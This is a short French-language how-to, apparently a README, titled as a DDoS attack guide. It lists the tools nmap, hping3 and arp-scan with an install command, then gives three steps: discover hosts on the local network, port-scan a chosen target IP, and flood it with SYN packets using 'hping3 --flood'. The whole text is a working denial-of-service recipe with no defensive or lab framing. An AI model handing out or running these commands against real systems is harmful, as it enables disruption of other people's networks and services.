# attaque par DDOS

## prérequis :
* nmap
* hping3
* arp-scan
  ### comment les installés  :
    - ~$` sudo apt-get install nmap arp-scan hping3`

## Faire un attaque DDOS :

  1. Analyser et afficher la liste des utilisateurs connectés au réseau :
     * ~$ `sudo arp-scan -l`
  2. Analyser les ports utilisés par l’adresse IP ciblée :
       * ~$ `sudo nmap ip_address`
  3. Attaque DDOS : 
       * ~$`sudo hping3 --flood -p port -S ip_address`